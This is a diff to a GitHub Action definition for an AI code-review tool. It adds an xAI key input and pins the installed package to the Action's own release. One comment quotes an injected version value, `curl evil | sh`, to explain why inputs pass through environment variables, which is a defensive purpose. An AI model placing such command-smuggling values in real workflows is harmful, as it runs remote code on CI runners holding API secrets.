@@ -22,6 +22,10 @@ inputs:
     description: "Gemini API Key for Google reviewers"
     required: false
     default: ""
+  xai-api-key:
+    description: "xAI API Key for Grok reviewers (xai-api seats, read as XAI_API_KEY)"
+    required: false
+    default: ""
   args:
     description: "Additional arguments to pass to the jury CLI (e.g. '--post --auto')"
     required: false
@@ -42,7 +46,15 @@ inputs:
     required: false
     default: "2"
   version:
-    description: "ai-jury package version to install (defaults to latest)"
+    description: >-
+      ai-jury package version to install. Empty (the default) installs the
+      release this Action's own tree declares in its pyproject.toml, so
+      `@vX.Y.Z` runs ai-jury X.Y.Z and `@v1` runs the release the alias
+      points at (#867). A branch or SHA ref installs the version its own tree
+      declares, and fails until that release is on PyPI; pass `version: latest`
+      or a released number instead. `latest` installs the newest release on
+      PyPI, the behaviour before #867; any other value must look like a version
+      number.
     required: false
     default: ""
 
@@ -61,13 +73,28 @@ runs:
       # the line, so a value carrying a quote and a `;` becomes shell code —
       # `version: '1.0"; curl evil | sh; "'` would execute. #584 moved the other
       # four inputs out for exactly this reason and left this one behind.
+      #
+      # An empty `version` used to mean `pip install ai-jury`, the newest release, so
+      # pinning the Action pinned only its YAML (#867). The requirement is now worked
+      # out by scripts/action_install_spec.py from `version` and the pyproject.toml in
+      # GITHUB_ACTION_PATH, the Action's own checkout at the ref the workflow named.
       env:
         INPUT_VERSION: ${{ inputs.version }}
       run: |
-        if [ -n "$INPUT_VERSION" ]; then
-          python -m pip install "ai-jury==$INPUT_VERSION"
-        else
-          python -m pip install ai-jury
+        SPEC="$(python "$GITHUB_ACTION_PATH/scripts/action_install_spec.py")" || exit 2
+        # On Windows Python's stdout turns "\n" into "\r\n" and command substitution
+        # strips only the "\n", so a CR would reach pip. The script writes no newline
+        # at all; this strips a stray CR anyway. `$'\r'` is bash (3.2+), the shell of
+        # this step on every runner OS.
+        SPEC="${SPEC%$'\r'}"
+        echo "ai-jury: installing $SPEC"
+        # pip's own error does not say why a pinned version is missing. Between a
+        # version bump and its PyPI publication, a branch or SHA ref pins a release
+        # that does not exist yet, so name the way out. $SPEC is the script's
+        # validated output, not an input.
+        if ! python -m pip install "$SPEC"; then
+          echo "ai-jury: $SPEC could not be installed. A branch or SHA ref installs the version its own tree declares, and fails until that release is on PyPI; pass version: latest or a released number." >&2
+          exit 1
         fi
 
     - name: Run ai-jury
@@ -77,6 +104,7 @@ runs:
         OPENAI_API_KEY: ${{ inputs.openai-api-key }}
         ANTHROPIC_API_KEY: ${{ inputs.anthropic-api-key }}
         GEMINI_API_KEY: ${{ inputs.gemini-api-key }}
+        XAI_API_KEY: ${{ inputs.xai-api-key }}
         INPUT_ARGS: ${{ inputs.args }}
         INPUT_MIN_VENDORS: ${{ inputs.min-vendors }}
         PR_NUM: ${{ github.event.pull_request.number }}
